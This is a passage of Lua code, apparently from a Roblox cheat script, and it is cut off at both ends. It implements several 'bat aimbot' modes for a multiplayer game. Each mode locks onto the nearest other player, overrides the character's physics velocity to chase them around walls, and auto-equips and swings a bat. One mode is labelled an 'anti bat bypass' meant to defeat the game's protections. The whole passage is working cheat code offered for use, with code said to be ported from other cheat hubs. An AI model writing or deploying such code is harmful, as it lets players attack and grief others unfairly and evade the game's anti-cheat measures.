            if v:IsA("BoolValue") and v.Value then return true end
            if v:IsA("ObjectValue") and v.Value then return true end
            if v:IsA("StringValue") and v.Value ~= "" then return true end
        end
    end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart",true) then
            local n = child.Name:lower()
            if n:find("brainrot") or n:find("animal") or n:find("carry") or n:find("grab") or n:find("steal") or n:find("hold") then
                return true
            end
        end
    end
    return false
end
function engine.findBat()
    local char=LP.Character; if not char then return nil end
    for _,t in ipairs(char:GetChildren()) do if t:IsA("Tool") and (t.Name:lower():find("bat") or t.Name:lower():find("slap")) then return t end end
    local bp=LP:FindFirstChild("Backpack")
    if bp then for _,t in ipairs(bp:GetChildren()) do if t:IsA("Tool") and (t.Name:lower():find("bat") or t.Name:lower():find("slap")) then return t end end end
    return nil
end
engine.lock = engine.lock or {target=nil}
local function _aceTargetAlive(t)
    if not t or not t.Parent or not t:IsDescendantOf(workspace) then return false end
    local h = t.Parent:FindFirstChildOfClass("Humanoid")
    return h ~= nil and h.Health > 0
end
function engine.closest()
    local root=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart"); if not root then return nil end
    local best = engine.closestRaw()
    local cur = engine.lock.target
    if _aceTargetAlive(cur) then
        if not best or best == cur then return cur end
        local dc = (cur.Position-root.Position).Magnitude
        local db = (best.Position-root.Position).Magnitude
        -- so troca se o novo alvo estiver bem mais perto
        if dc < 60 and db > dc*0.6 then return cur end
    end
    engine.lock.target = best
    return best
end
function engine.closestRaw()
    local root=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart"); if not root then return nil end
    local closest,minDist=nil,math.huge
    for _,plr in ipairs(Players:GetPlayers()) do
        if plr~=LP and plr.Character then
            local tRoot=plr.Character:FindFirstChild("HumanoidRootPart")
            local hum=plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health>0 then
                local dist=(tRoot.Position-root.Position).Magnitude
                if dist<minDist then minDist=dist; closest=tRoot end
            end
        end
    end
    return closest
end

-- ============================================================
-- PATHFINDING / CHASE BYPASS (porte do Ambitious)
-- Raios para desviar de paredes + rota real do PathfindingService,
-- recalculada com frequencia porque o alvo se move.
-- ============================================================
engine.path = engine.path or {}
engine.path.cfg = {
    PROBE = 14, ANGLES = {18,36,54,72,90}, WALL_Y = 0.6,
    WP_REACH = 4, RECOMPUTE = 1.25, GOAL_DRIFT = 6,
}
function engine.path.rayParams()
    local params = RaycastParams.new()
    local ignore = {}
    local ch = LP.Character
    if ch then ignore[#ignore+1] = ch end
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character then ignore[#ignore+1] = plr.Character end
    end
    params.FilterDescendantsInstances = ignore
    params.FilterType = Enum.RaycastFilterType.Exclude
    params.IgnoreWater = true
    return params
end
function engine.path.blocked(origin, dir, dist, params)
    local res = workspace:Raycast(origin, dir * dist, params)
    if not res then return false end
    if math.abs(res.Normal.Y) > engine.path.cfg.WALL_Y then return false end
    return true
end
function engine.path.steer(origin, dir, dist)
    if dir.Magnitude < 0.01 then return dir end
    dir = dir.Unit
    local C = engine.path.cfg
    dist = dist or C.PROBE
    local params = engine.path.rayParams()
    local low = origin - Vector3.new(0, 2, 0)
    if not engine.path.blocked(origin, dir, dist, params)
       and not engine.path.blocked(low, dir, dist, params) then
        return dir
    end
    for _, deg in ipairs(C.ANGLES) do
        for _, sign in ipairs({1, -1}) do
            local rot = CFrame.Angles(0, math.rad(deg * sign), 0)
            local cand = rot:VectorToWorldSpace(dir)
            cand = Vector3.new(cand.X, 0, cand.Z)
            if cand.Magnitude > 0.01 then
                cand = cand.Unit
                if not engine.path.blocked(origin, cand, dist, params)
                   and not engine.path.blocked(low, cand, dist, params) then
                    return cand
                end
            end
        end
    end
    return dir
end
engine.path.paths = engine.path.paths or {}
function engine.path.reset(key) engine.path.paths[key] = nil end
function engine.path.dirTo(key, from, goal, opts)
    local C = engine.path.cfg
    local st = engine.path.paths[key]
    local now = os.clock()
    local recompute = (opts and tonumber(opts.recompute)) or C.RECOMPUTE
    local drift     = (opts and tonumber(opts.drift))     or C.GOAL_DRIFT
    if st and st.goal and (st.goal - goal).Magnitude > drift then st = nil end
    if not st then
        st = {goal = goal, wp = nil, i = 1, computing = false, last = 0}
        engine.path.paths[key] = st
    end
    if not st.computing and (not st.wp or (now - st.last) > recompute) then
        st.computing = true
        st.last = now
        st.goal = goal
        local origin = from
        task.spawn(function()
            local ok, path = pcall(function()
                engine.path.svc = engine.path.svc or game:GetService("PathfindingService")
                local pth = engine.path.svc:CreatePath({
                    AgentRadius = 2.5, AgentHeight = 5, AgentCanJump = true, WaypointSpacing = 6,
                })
                pth:ComputeAsync(origin, goal)
                return pth
            end)
            local cur = engine.path.paths[key]
            if cur ~= st then return end
            st.computing = false
            if ok and path and path.Status == Enum.PathStatus.Success then
                local pts = path:GetWaypoints()
                st.wp = pts
                st.i = math.min(2, #pts)
            else
                st.wp = nil
            end
        end)
    end
    local wp = st.wp
    if not wp or #wp == 0 then return nil end
    while st.i <= #wp do
        local pt = wp[st.i].Position
        local d = Vector3.new(pt.X - from.X, 0, pt.Z - from.Z)
        if d.Magnitude > C.WP_REACH then
            if d.Magnitude < 0.01 then return nil end
            return d.Unit
        end
        st.i = st.i + 1
    end
    return nil
end

end

startBatAimbot = function()
    -- Stop any running version first
    if Conns.aimbot then Conns.aimbot:Disconnect(); Conns.aimbot = nil end
    pcall(function() if _G.BlastAimbotV2 then _G.BlastAimbotV2.Stop() end end)
    pcall(function() if _G.BlastAimbotV3 then _G.BlastAimbotV3.Stop() end end)
    pcall(function() if _G.BlastAimbotV4 then _G.BlastAimbotV4.Stop() end end)
    local isBypass = (State.aimbotMode or "normal") == "antiBatBypass"
    local ver = tostring(isBypass and State.bypassAimbotVersion or "v1"):lower()
    State.batAimbotVersion = ver
    if ver == "v2" then
        if _G.BlastAimbotV2 then _G.BlastAimbotV2.Start() end
        return
    elseif ver == "v3" then
        if _G.BlastAimbotV3 then _G.BlastAimbotV3.Start() end
        return
    elseif ver == "v4" then
        if _G.BlastAimbotV4 then _G.BlastAimbotV4.Start() end
        return
    end
    -- V1 = hub original aimbot (below)
    if Conns.aimbot then Conns.aimbot:Disconnect() end
    local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum0 then hum0.AutoRotate = false end

    Conns.aimbot = RunService.RenderStepped:Connect(function()
        if not State.batAimbotToggled then return end
        local char = LP.Character; if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
        local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end

        if State.aimbotMode == "normal" then
            -- MysteryVs BAT AIMBOT (normal): target lock, obstacle routing,
            -- predictive chase, automatic equip and 0.08-second swing cooldown.
            local engine = _G.EmbeerMysteryBat
            local target = engine.closest()
            if not target then
                _aimbotTarget = nil
                return
            end
            _aimbotTarget = target
            hum.AutoRotate = false
            local blocked = engine.holdingBrainrot()
            local bat = char:FindFirstChildOfClass("Tool") or engine.findBat()
            if bat and bat.Parent ~= char and not blocked then
                pcall(function() hum:EquipTool(bat) end)
            end
            local chaseSpeed = math.clamp(tonumber(State.AimbotSpeed) or 50, 1, 500)
            local targetVel, myPos, targetPos = target.AssemblyLinearVelocity, root.Position, target.Position
            local predictPos = targetPos + targetVel * 0.14 + target.CFrame.LookVector * 0.3
            local direction = predictPos - myPos
            if direction.Magnitude < 0.01 then return end
            local flatDir = Vector3.new(direction.X, 0, direction.Z)
            if flatDir.Magnitude < 0.01 then return end
            flatDir = flatDir.Unit
            local pd = engine.path.dirTo("aimbot", myPos, targetPos, {recompute = 0.35, drift = 4})
            if pd then flatDir = pd end
            local yVel = (targetPos.Y + 3.7 - myPos.Y) * 19.5 + targetVel.Y * 0.8
            if hum.FloorMaterial ~= Enum.Material.Air then yVel = math.max(yVel, 13) end
            yVel = math.clamp(yVel, -70, 110)
            local desiredVel = Vector3.new(flatDir.X * chaseSpeed, yVel, flatDir.Z * chaseSpeed)
            root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8)
            local predictTime = math.clamp(targetVel.Magnitude / 150, 0.05, 0.2)
            local predictedPos = targetPos + targetVel * predictTime
            if (predictedPos - myPos).Magnitude > 0.1 then
                local diffCF = root.CFrame:Inverse() * CFrame.lookAt(myPos, predictedPos)
                local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
                root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(
                    math.clamp(rx, -2.5, 2.5) * 42,
                    math.clamp(ry, -2.5, 2.5) * 42,
                    math.clamp(rz, -2.5, 2.5) * 42))
            end
            if State.autoSwingEnabled and bat and not engine.swingCooldown and not blocked then
                engine.swingCooldown = true
                local generation = engine.generation
                pcall(function() bat:Activate() end)
                task.delay(0.08, function()
                    if engine.generation == generation then engine.swingCooldown = false end
                end)
            end
        else
            -- Spectrum Aimbot mode
            if not char:FindFirstChildOfClass("Tool") then
                local bat = findBat()
                if bat then pcall(function() hum:EquipTool(bat) end) end
            end

            local target, targetDist = getClosestTarget()
            if not target then swingCurrentBat(); return end
            local myPos=root.Position
            local targetPos=target.Position
            local direction=targetPos-myPos
            local flatDir=Vector3.new(direction.X,0,direction.Z)
            if flatDir.Magnitude>0 then flatDir=flatDir.Unit else flatDir=Vector3.zero end
            local chaseSpeed=math.clamp(tonumber(State.BypassSpeed) or 58, 1, 500)
            local desiredHeight=targetPos.Y+3.7
            local yVel=(desiredHeight-myPos.Y)*19.5
            if hum.FloorMaterial~=Enum.Material.Air then yVel=math.max(yVel,13) end
            yVel=math.clamp(yVel,-70,110)
            local desiredVel=Vector3.new(flatDir.X*chaseSpeed,yVel,flatDir.Z*chaseSpeed)
            root.AssemblyLinearVelocity=root.AssemblyLinearVelocity:Lerp(desiredVel,0.8)
            local toTarget=targetPos-myPos
            if toTarget.Magnitude>0.1 then
                local goalCF=CFrame.lookAt(myPos,targetPos)
                local diffCF=root.CFrame:Inverse()*goalCF
                local rx,ry,rz=diffCF:ToEulerAnglesXYZ()
                rx=math.clamp(rx,-2.5,2.5)
                ry=math.clamp(ry,-2.5,2.5)
                rz=math.clamp(rz,-2.5,2.5)
                root.AssemblyAngularVelocity=root.CFrame:VectorToWorldSpace(Vector3.new(rx*42,ry*42,rz*42))
            end
            if targetDist<=8 then trySwing() end
        end
    end)
end

stopBatAimbot = function()
    local engine = _G.EmbeerMysteryBat
    if engine then
        engine.generation = engine.generation + 1
        engine.swingCooldown = false
        engine.lock.target = nil
        engine.path.reset("aimbot")
    end
    if Conns.aimbot then Conns.aimbot:Disconnect(); Conns.aimbot = nil end
    _aimbotTarget = nil
    pcall(function() if _G.BlastAimbotV2 then _G.BlastAimbotV2.Stop() end end)
    pcall(function() if _G.BlastAimbotV3 then _G.BlastAimbotV3.Stop() end end)
    pcall(function() if _G.BlastAimbotV4 then _G.BlastAimbotV4.Stop() end end)
    local c = LP.Character
    local root = c and c:FindFirstChild("HumanoidRootPart")
    if root then root.AssemblyLinearVelocity = Vector3.zero; root.AssemblyAngularVelocity = Vector3.zero end
    local hum2 = c and c:FindFirstChildOfClass("Humanoid")
    if hum2 then hum2.AutoRotate = true end
    State.hittingCooldown = false
end

-- ============================================================
-- AIMBOT V2 (LOL Bubble Aimbot V2 — VX7 LinearVelocity) + V3 alias
-- ============================================================
(function()
    local state = {
        enabled = false,
        connection = nil,
        autoSwing = true,
        approachSpeed = 58,
        laggerSpeed = 40,
        useLaggerSpeed = false,
        predCache = {},
        moverName = "Blast_AimbotV2_LV",
        attachmentName = "Blast_AimbotV2_Att",
        minForce = 1000000,
        maxForce = 50000000,
    }

    local function getCharacterParts()
        local char = LP.Character
        if not char then return nil, nil end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or hum.Health <= 0 then return nil, nil end
        return hrp, hum
    end

    local function getBatTool()
        local char = LP.Character
        if not char then return nil end
        for _, child in ipairs(char:GetChildren()) do
            if child:IsA("Tool") then
                local n = string.lower(child.Name)
                if string.find(n, "bat", 1, true) or string.find(n, "slap", 1, true) then return child end
            end
        end
        local backpack = LP:FindFirstChildOfClass("Backpack")
        if backpack then
            for _, child in ipairs(backpack:GetChildren()) do
                if child:IsA("Tool") then
                    local n = string.lower(child.Name)
                    if string.find(n, "bat", 1, true) or string.find(n, "slap", 1, true) then return child end
                end
            end
        end
        return nil
    end

    local function nearestTarget(fromPos)
        local bestDist, bestHRP = math.huge, nil
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP then
                local char = plr.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                if hrp and hum and hum.Health > 0 then
                    local dist = (hrp.Position - fromPos).Magnitude
                    if dist < bestDist then bestDist, bestHRP = dist, hrp end
                end
            end
        end
        return bestHRP
    end

    local function clearMover(hrp)
        if not hrp then return end
        local lv = hrp:FindFirstChild(state.moverName)
        local att = hrp:FindFirstChild(state.attachmentName)
        if lv and lv:IsA("LinearVelocity") then lv:Destroy() end
        if att and att:IsA("Attachment") then att:Destroy() end
    end

    local function ensureMover(hrp, speed)
        local att = hrp:FindFirstChild(state.attachmentName)
        if not att or not att:IsA("Attachment") then
            if att then att:Destroy() end
            att = Instance.new("Attachment")
            att.Name = state.attachmentName
            att.Parent = hrp
        end
        local lv = hrp:FindFirstChild(state.moverName)
        if not lv or not lv:IsA("LinearVelocity") then
            if lv then lv:Destroy() end
            lv = Instance.new("LinearVelocity")
            lv.Name = state.moverName
            lv.Attachment0 = att
            lv.RelativeTo = Enum.ActuatorRelativeTo.World
            lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Vector
            lv.ForceLimitsEnabled = true
            lv.ForceLimitMode = Enum.ForceLimitMode.PerAxis
            lv.VectorVelocity = Vector3.zero
            lv.Parent = hrp
        else
            lv.Attachment0 = att
        end
        local force = math.clamp(hrp.AssemblyMass * math.max(speed * 220, 6000), state.minForce, state.maxForce)
        lv.MaxAxesForce = Vector3.new(force, force, force)
        lv.Enabled = true
        return lv
    end

    local function applyMove(hrp, desiredVel, speed, dt)
        local lv = ensureMover(hrp, speed)
        local alpha = 1 - math.exp(-math.max(dt, 0) * 26)
        lv.VectorVelocity = lv.VectorVelocity:Lerp(desiredVel, alpha)
    end

    local function resetMotion()
        local hrp, hum = getCharacterParts()
        if hrp then
            clearMover(hrp)
            hrp.Anchored = false
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
            local look = hrp.CFrame.LookVector
            local flat = Vector3.new(look.X, 0, look.Z)
            if flat.Magnitude > 0.01 then flat = flat.Unit else flat = Vector3.new(0, 0, -1) end
            hrp.CFrame = CFrame.lookAt(hrp.Position, hrp.Position + flat)
        end
        if hum then
            hum.AutoRotate = true
            hum.PlatformStand = false
            pcall(function() hum:Move(Vector3.zero, false) end)
            pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
        end
    end

    local function update(dt)
        if not state.enabled then return end
        if not State.batAimbotToggled then return end
        local hrp, hum = getCharacterParts()
        if not hrp or not hum then clearMover(hrp) return end
        local target = nearestTarget(hrp.Position)
        if not target then
            hum.AutoRotate = true
            hrp.AssemblyAngularVelocity = Vector3.zero
            clearMover(hrp)
            return
        end
        local speed = state.useLaggerSpeed and state.laggerSpeed or state.approachSpeed
        local configuredSpeed = State.aimbotMode == "antiBatBypass" and State.BypassSpeed or State.AimbotSpeed
        speed = math.clamp(tonumber(configuredSpeed) or speed, 1, 500)
        local now = tick()
        local cache = state.predCache[target]
        local predictedVel = Vector3.zero
        if not cache then
            state.predCache[target] = { pos = target.Position, time = now, vel = Vector3.zero }
        else
            local dtPred = math.clamp(now - cache.time, 1/120, 0.25)
            local rawVel = (target.Position - cache.pos) / dtPred
            if rawVel.Magnitude > 80 then rawVel = rawVel.Unit * 80 end
            cache.vel = cache.vel:Lerp(rawVel, 0.25)
            cache.pos = target.Position
            cache.time = now
            predictedVel = cache.vel
        end
        local lookAhead = math.clamp(predictedVel.Magnitude / 130, 0.05, 0.12)
        local aimPoint = target.Position + predictedVel * lookAhead + Vector3.new(0, 1, 0)
        hum.AutoRotate = false
        local toTarget = aimPoint - hrp.Position
        local flatDir = Vector3.new(toTarget.X, 0, toTarget.Z)
        if toTarget.Magnitude > 0.01 and flatDir.Magnitude > 0.01 then
            local yawDelta = (math.deg(math.atan2(-flatDir.X, -flatDir.Z)) - hrp.Orientation.Y + 180) % 360 - 180
            local pitchDelta = (math.deg(math.atan2(toTarget.Y, flatDir.Magnitude)) - hrp.Orientation.X + 180) % 360 - 180
            local yawForce = math.clamp(math.rad(yawDelta) * 285, -28, 28)
            local pitchForce = math.clamp(math.rad(pitchDelta) * 285, -28, 28)
            local right = Vector3.new(math.cos(math.rad(hrp.Orientation.Y)), 0, -math.sin(math.rad(hrp.Orientation.Y)))
            hrp.AssemblyAngularVelocity = Vector3.new(0, yawForce, 0) + right * pitchForce
        else
            hrp.AssemblyAngularVelocity = Vector3.zero
        end
        local moveVec = (aimPoint + Vector3.new(0, 4.75, 0) - hrp.Position)
        local flatMove = Vector3.new(moveVec.X, 0, moveVec.Z)
        local horizontal = flatMove.Magnitude > 0.1 and flatMove.Unit * speed or Vector3.zero
        local vertical = math.abs(moveVec.Y) > 0.1 and Vector3.new(0, math.sign(moveVec.Y) * 52, 0) or Vector3.new(0, -2, 0)
        applyMove(hrp, horizontal + vertical, speed, dt)
        if flatMove.Magnitude > 0.5 then hum:Move(flatMove.Unit, false) end
        if state.autoSwing then
            local bat = getBatTool()
            if bat and bat.Parent == LP.Character then pcall(function() bat:Activate() end) end
        end
    end

    local AimbotV2 = {}
    function AimbotV2.Start(opts)
        opts = opts or {}
        if state.enabled then
            AimbotV2.Stop()
        end
        state.enabled = true
        state.autoSwing = opts.autoSwing ~= false
        if State.autoSwingEnabled == false then state.autoSwing = false end
        local configuredSpeed = State.aimbotMode == "antiBatBypass" and State.BypassSpeed or State.AimbotSpeed
        state.approachSpeed = tonumber(opts.speed) or tonumber(configuredSpeed) or 58
        state.laggerSpeed = tonumber(opts.laggerSpeed) or 40
        state.useLaggerSpeed = opts.useLaggerSpeed == true
        state.predCache = {}
        local _, hum = getCharacterParts()
        if hum then
            local bat = getBatTool()
            if bat and bat.Parent ~= LP.Character then pcall(function() hum:EquipTool(bat) end) end
        end
        clearMover(select(1, getCharacterParts()))
        state.connection = RunService.RenderStepped:Connect(update)
        Conns.aimbotV2 = state.connection
    end
    function AimbotV2.Stop()
        if not state.enabled and not state.connection then return end
        state.enabled = false
        if state.connection then state.connection:Disconnect() state.connection = nil end
        Conns.aimbotV2 = nil
        resetMotion()
        state.predCache = {}
    end
    function AimbotV2.IsEnabled() return state.enabled end
    function AimbotV2.SetLaggerMode(active) state.useLaggerSpeed = active == true end
    function AimbotV2.SetAutoSwing(active) state.autoSwing = active == true end
    function AimbotV2.SetSpeed(normal, lagger)
        if normal then state.approachSpeed = math.clamp(tonumber(normal) or 58, 1, 500) end
        if lagger then state.laggerSpeed = math.clamp(tonumber(lagger) or 40, 1, 500) end
    end

    _G.BlastAimbotV2 = AimbotV2
    _G.__BubbleAimbotV2 = AimbotV2
end)()

-- ============================================================
-- AIMBOT V3 = BAT BYPASS (retirado do Fluxo.Vs)
-- ============================================================
do
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local localPlayer = Players.LocalPlayer
    local BAT_V2_SPEED, BAT_V2_HIT_DIST, BAT_V2_LEAD_STUDS = 55, 13, 3
    local snowVS = { BatBypass = {} }
    do
        local batBypass = snowVS.BatBypass
        batBypass.Enabled = batBypass.Enabled or false
        batBypass.Connection = batBypass.Connection or nil
        batBypass.Z = batBypass.Z
            or {
                targetPlayer = nil,
                lastTargetPos = nil,
                targetVelocity = Vector3.zero,
                smoothedVelocity = Vector3.zero,
                velocityHistory = {},
                accelerationHistory = {},
                aerialVelocityHistory = {},
                previousDirection = nil,
                lastDirectionChangeTime = 0,
                airborneTime = 0,
                lastActivationTime = 0,
                currentPing = 0.1,
                realPingMs = 0,
            }
        batBypass.ZCFG = batBypass.ZCFG
            or {
                FOLLOW_SPEED = BAT_V2_SPEED,
                ACTIVATE_DISTANCE = BAT_V2_HIT_DIST,
                MIN_FOLLOW_DISTANCE = 1,
                PREDICTION_TIME = 0.22,
                PREDICT_AHEAD = BAT_V2_LEAD_STUDS,
                MAX_VELOCITY_CHANGE = 150,
                VELOCITY_SMOOTHING = 0.2,
                MAX_HORIZONTAL_VELOCITY = 80,
                SERVER_TICKRATE = 0.016666666666666666,
                MIN_PING_COMPENSATION = 0.03,
                MAX_PING_COMPENSATION = 0.25,
                ACCELERATION_PREDICTION_WEIGHT = 0.3,
                DIRECTION_CHANGE_DETECTION_TIME = 0.12,
                QUICK_DIRECTION_CHANGE_MULTIPLIER = 1.5,
                GRAVITY = 196.2,
                AIR_CONTROL_FACTOR = 0.8,
                MIN_AIRBORNE_TIME = 0.08,
            }
        local function averageVectors(vectors)
            if #vectors == 0 then
                return Vector3.zero
            end
            local sum = Vector3.zero
            for _, entry in ipairs(vectors) do
                sum += entry
            end
            return sum / #vectors
        end
        local function pushBounded(history, entry, maxEntries)
            table.insert(history, entry)
            if #history > maxEntries then
                table.remove(history, 1)
            end
        end
        batBypass.FindBat = function()
            local character = localPlayer.Character
            if not character then
                return nil
            end
            local tool = character:FindFirstChildOfClass("Tool")
            if tool then
                local lowercaseText = tool.Name:lower()
                if lowercaseText:find("bat", 1, true) or lowercaseText:find("slap", 1, true) then
                    return tool
                end
            end
            local backpack = localPlayer:FindFirstChildOfClass("Backpack")
            if backpack then
                for _, child in ipairs(backpack:GetChildren()) do
                    if child:IsA("Tool") then
                        local lowercaseText = child.Name:lower()
                        if lowercaseText:find("bat", 1, true) or lowercaseText:find("slap", 1, true) then
                            return child
                        end
                    end
                end
            end
            return nil
        end
        local function resetPredictionState()
            local z = batBypass.Z
            z.targetPlayer = nil
            z.lastTargetPos = nil
            z.targetVelocity = Vector3.zero
            z.smoothedVelocity = Vector3.zero
            z.velocityHistory = {}
            z.accelerationHistory = {}
            z.aerialVelocityHistory = {}
            z.previousDirection = nil
            z.airborneTime = 0
        end
        local function findClosestPlayer(rootPart)
            local closestDistance = math.huge
            local closestPlayer = nil
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= localPlayer and player.Character then
                    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                    if humanoidRootPart and humanoid and humanoid.Health > 0 then
                        local magnitude = (rootPart.Position - humanoidRootPart.Position).Magnitude
                        if magnitude < closestDistance then
                            closestDistance = magnitude
                            closestPlayer = player
                        end
                    end
                end
            end
            return closestPlayer
        end
        local function applyAngularAim(rootPart, direction)
            if direction.Magnitude < 0.01 then
                return
            end
            local crossVector = rootPart.CFrame.LookVector:Cross(direction.Unit)
            local angle = math.asin(math.clamp(crossVector.Magnitude, -1, 1))
            rootPart.AssemblyAngularVelocity = crossVector.Magnitude > 0.1 and crossVector.Unit * angle * 80
                or Vector3.zero
        end
        local function updatePing()
            local ok, result = pcall(function()
                return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
            end)
            local z = batBypass.Z
            if ok and type(result) == "number" then
                z.realPingMs = math.floor(result)
            end
            z.currentPing = math.clamp(
                z.realPingMs / 1000,
                batBypass.ZCFG.MIN_PING_COMPENSATION,
                batBypass.ZCFG.MAX_PING_COMPENSATION
            )
        end
        batBypass.PingLoopStarted = batBypass.PingLoopStarted or false
        if not batBypass.PingLoopStarted then
            batBypass.PingLoopStarted = true
            task.spawn(function()
                while true do
                    pcall(updatePing)
                    task.wait(0.5)
                end
            end)
        end
        batBypass.StartBodyLock = function() end
        batBypass.StopBodyLock = function() end
        batBypass.Stop = function()
            local z = batBypass.Z
            batBypass.Enabled = false
            if batBypass.Connection then
                batBypass.Connection:Disconnect()
                batBypass.Connection = nil
            end
            local character = localPlayer.Character
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            character = character and character:FindFirstChild("HumanoidRootPart")
            if humanoid then
                humanoid.AutoRotate = true
            end
            if character then
                character.AssemblyAngularVelocity = Vector3.zero
            end
            resetPredictionState()
            z.lastActivationTime = 0
        end
        batBypass.Start = function()
            if batBypass.Connection then
                return
            end
            local character = localPlayer.Character
            local humanoid1387 = character and character:FindFirstChildOfClass("Humanoid")
            local rootPart = character and character:FindFirstChild("HumanoidRootPart")
            if not humanoid1387 or not rootPart then
                return
            end
            batBypass.Enabled = true
            humanoid1387.AutoRotate = false
            local tool = batBypass.FindBat()
            if tool and tool.Parent ~= character then
                pcall(function()
                    humanoid1387:EquipTool(tool)
                end)
            end
            batBypass.Connection = RunService.RenderStepped:Connect(function(deltaTime)
                if not batBypass.Enabled then
                    batBypass.Stop()
                    return
                end
                local z = batBypass.Z
                local zcfg = batBypass.ZCFG
                zcfg.FOLLOW_SPEED = math.clamp(tonumber(State.BypassSpeed) or BAT_V2_SPEED, 1, 500)
                local character2 = localPlayer.Character
                local rootPart1394 = character2 and character2:FindFirstChild("HumanoidRootPart")
                local humanoid = character2 and character2:FindFirstChildOfClass("Humanoid")
                if not rootPart1394 or not humanoid or humanoid.Health <= 0 then
                    return
                end
                humanoid.AutoRotate = false
                rootPart = rootPart1394
                humanoid1387 = humanoid
                tool = character2:FindFirstChildOfClass("Tool") or batBypass.FindBat()
                if tool and tool.Parent ~= character2 then
                    pcall(humanoid.EquipTool, humanoid, tool)
                end
                z.targetPlayer = findClosestPlayer(rootPart)
                local character3 = z.targetPlayer and z.targetPlayer.Character
                local rootPart1442 = character3 and character3:FindFirstChild("HumanoidRootPart")
                character3 = character3 and character3:FindFirstChildOfClass("Humanoid")
                if not rootPart1442 or not character3 or character3.Health <= 0 then
                    resetPredictionState()
                    return
                end
                local position = rootPart1442.Position
                local sampleDeltaTime = math.max(deltaTime, 0.0041666666666666666)
                if z.lastTargetPos then
                    local targetVelocity = (position - z.lastTargetPos) / sampleDeltaTime
                    local vector = targetVelocity - z.targetVelocity
                    if zcfg.MAX_VELOCITY_CHANGE < vector.Magnitude then
                        targetVelocity = z.targetVelocity + vector.Unit * zcfg.MAX_VELOCITY_CHANGE
                    end
                    local vector3 = Vector3.new(targetVelocity.X, 0, targetVelocity.Z)
                    if vector3.Magnitude > zcfg.MAX_HORIZONTAL_VELOCITY then
                        local vector = vector3.Unit * zcfg.MAX_HORIZONTAL_VELOCITY
                        targetVelocity = Vector3.new(vector.X, targetVelocity.Y, vector.Z)
                    end
                    pushBounded(z.accelerationHistory, (targetVelocity - z.targetVelocity) / sampleDeltaTime, 4)
                    pushBounded(z.velocityHistory, targetVelocity, 8)
                    z.targetVelocity = targetVelocity
                    z.smoothedVelocity = z.smoothedVelocity:Lerp(targetVelocity, zcfg.VELOCITY_SMOOTHING)
                end
                z.lastTargetPos = position
                local isAirborne = character3.FloorMaterial == Enum.Material.Air
                z.airborneTime = isAirborne and z.airborneTime + sampleDeltaTime or 0
                if isAirborne and z.airborneTime >= zcfg.MIN_AIRBORNE_TIME then
                    pushBounded(z.aerialVelocityHistory, z.targetVelocity, 6)
                elseif not isAirborne then
                    z.aerialVelocityHistory = {}
                end
                local smoothedVelocity = z.smoothedVelocity
                if isAirborne and #z.aerialVelocityHistory > 0 then
                    local vector = averageVectors(z.aerialVelocityHistory)
                    smoothedVelocity = Vector3.new(vector.X, z.targetVelocity.Y, vector.Z) * zcfg.AIR_CONTROL_FACTOR
                end
                local changedDirectionQuickly = false
                local vector3 = Vector3.new(z.targetVelocity.X, 0, z.targetVelocity.Z)
                if vector3.Magnitude > 5 then
                    local unit = vector3.Unit
                    if z.previousDirection and z.previousDirection:Dot(unit) < 0.5 then
                        local lastDirectionChangeTime = z.lastDirectionChangeTime
                        changedDirectionQuickly = tick() - lastDirectionChangeTime
                            < zcfg.DIRECTION_CHANGE_DETECTION_TIME
                        z.lastDirectionChangeTime = tick()
                    end
                    z.previousDirection = unit
                end
                local predictionTime = z.currentPing + zcfg.SERVER_TICKRATE
                if changedDirectionQuickly then
                    predictionTime *= zcfg.QUICK_DIRECTION_CHANGE_MULTIPLIER
                end
                local accelerationPredictionWeight = zcfg.ACCELERATION_PREDICTION_WEIGHT
                local predictedPosition = position
                    + smoothedVelocity * predictionTime
                    + averageVectors(z.accelerationHistory)
                        * accelerationPredictionWeight
                        * predictionTime
                        * predictionTime
                        * 0.5
                local leadTime = zcfg.PREDICTION_TIME * 1.1
                local leadPosition
                if isAirborne then
                    leadPosition = predictedPosition
                        + smoothedVelocity * leadTime
                        + Vector3.new(0, -0.5 * zcfg.GRAVITY * leadTime * leadTime, 0)
                else
                    leadPosition = predictedPosition + smoothedVelocity * leadTime
                end
                local vector4 = Vector3.new(smoothedVelocity.X, 0, smoothedVelocity.Z)
                if vector4.Magnitude > 1 then
                    leadPosition += vector4.Unit * zcfg.PREDICT_AHEAD
                end
                local targetDirection = leadPosition - rootPart.Position
                applyAngularAim(rootPart, targetDirection)
                local withinActivationRange = (position - rootPart.Position).Magnitude <= zcfg.ACTIVATE_DISTANCE
                if withinActivationRange then
                    local lastActivationTime = z.lastActivationTime
                    withinActivationRange = tick() - lastActivationTime >= 0.3
                end
                if withinActivationRange then
                    if tool then
                        pcall(tool.Activate, tool)
                    end
                    z.lastActivationTime = tick()
                end
                if zcfg.MIN_FOLLOW_DISTANCE < targetDirection.Magnitude then
                    rootPart.AssemblyLinearVelocity = targetDirection.Unit * zcfg.FOLLOW_SPEED
                else
